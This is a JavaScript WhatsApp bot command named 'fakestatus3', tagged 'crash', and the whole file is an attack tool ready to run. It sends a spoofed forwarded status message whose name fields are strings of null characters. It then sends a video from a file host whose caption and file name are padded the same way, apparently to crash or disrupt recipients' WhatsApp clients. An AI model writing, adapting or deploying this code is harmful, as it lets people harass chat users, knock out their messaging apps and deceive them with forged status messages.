let handler = async (m, { conn }) => {
  try {
    const nullChar = '\u0000';

    const repeatEstado = 8; 
    const repeatVideo = 6;

    const fakeNameEstado = nullChar.repeat(repeatEstado);
    const fakeNameVideo = 'Tobi' + nullChar.repeat(repeatVideo);

    const videoUrl = 'https://files.catbox.moe/cs2psi.mp4';

    await conn.sendMessage(m.chat, {
      text: `WhatsApp • Status\n📄 ${fakeNameEstado}`,
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999,
        externalAdReply: {
          title: fakeNameEstado,
          body: '',
          mediaType: 1,
          previewType: 'NONE'
        }
      }
    }, { quoted: m });

    await conn.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: fakeNameVideo,
      gifPlayback: false,
      fileName: fakeNameVideo
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR EN fakestatus3]', e);
    await m.reply('❌ Error al ejecutar el comando.\n\n' + e.message);
  }
};

handler.command = ['fakestatus3'];
handler.help = ['fakestatus3'];
handler.tags = ['test', 'crash'];
handler.private = false;
handler.register = true;

export default handler;